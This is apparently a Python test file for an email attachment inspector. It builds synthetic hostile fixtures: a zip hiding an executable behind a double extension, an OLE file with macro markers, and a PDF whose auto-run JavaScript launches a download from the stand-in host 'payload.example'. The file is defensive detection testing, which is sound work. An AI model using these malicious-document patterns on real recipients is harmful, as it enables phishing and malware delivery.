"""The attachment inspector, against files shaped like the real thing.

This path had never run on production data — 102 stored email runs, zero
attachments between them — so the zip, OLE and PDF branches were written and
never exercised. These build the files rather than mocking the parse, because
what is being tested is whether the bytes are read correctly.

The clean-PDF case matters as much as the hostile ones: an inspector that
flags every document costs more than it saves.
"""

from __future__ import annotations

import base64
import io
import zipfile

from app.services.email_attachment_inspection import inspect_attachments


def _b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


def _zip_with_double_extension() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        archive.writestr("Invoice_8891.pdf.exe", b"MZ\x90\x00" + b"\x00" * 64)
        archive.writestr("readme.txt", b"please open the invoice")
    return buf.getvalue()


# A malicious PDF puts its address inside the JavaScript action, not in a
# /URI link annotation — the annotation is what a viewer renders, and nobody
# renders this one.
_JS_PDF = (
    b"%PDF-1.4\n"
    b"1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n"
    b"2 0 obj<</Type/Action/S/JavaScript/JS(app.launchURL\\('http://payload.example/x.exe'\\);)>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)

_CLEAN_PDF = b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"

_OLE_WITH_MACROS = (
    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 40 + b"VBA_Project" + b"\x00" * 32 + b"Macros" + b"\x00" * 16
)


def _inspect(name: str, data: bytes) -> dict:
    out = inspect_attachments([{"filename": name, "content_b64": _b64(data)}])
    return out["items"][0], out


def test_zip_hiding_an_executable_behind_a_document_name():
    item, out = _inspect("archive.zip", _zip_with_double_extension())
    assert item["inspected"] is True
    assert item["detected_type"]["kind"] == "zip"
    assert any(f["severity"] == "high" for f in item["findings"])
    assert any("Invoice_8891.pdf.exe" in f["detail"] for f in item["findings"])
    assert out["risk"] == "high"
    assert "archive.zip" in out["detonation_candidates"]


def test_pdf_javascript_is_reported_once_not_twice():
    """/JavaScript and /JS both appear in real PDFs and mean the same thing."""
    item, _ = _inspect("statement.pdf", _JS_PDF)
    js_findings = [f for f in item["findings"] if "JavaScript" in f["detail"]]
    assert len(js_findings) == 1, js_findings
    assert js_findings[0]["severity"] == "high"


def test_url_inside_pdf_javascript_is_recovered():
    """The /URI annotation pattern alone never sees this one."""
    _, out = _inspect("statement.pdf", _JS_PDF)
    assert "http://payload.example/x.exe" in out["urls_found_in_attachments"]


def test_open_action_is_reported_separately_from_javascript():
    item, _ = _inspect("statement.pdf", _JS_PDF)
    assert any("opens an action automatically" in f["detail"] for f in item["findings"])


def test_ole_macro_streams_are_detected():
    item, out = _inspect("quarterly.doc", _OLE_WITH_MACROS)
    assert item["detected_type"]["kind"] == "ole"
    assert any("macro" in f["detail"].lower() for f in item["findings"])
    assert out["risk"] == "high"


def test_a_plain_pdf_produces_nothing():
    """The control. Over-reporting here taxes every clean email."""
    item, out = _inspect("harmless.pdf", _CLEAN_PDF)
    assert item["inspected"] is True
    assert item["findings"] == []
    assert out["risk"] == "none"
    assert out["detonation_candidates"] == []
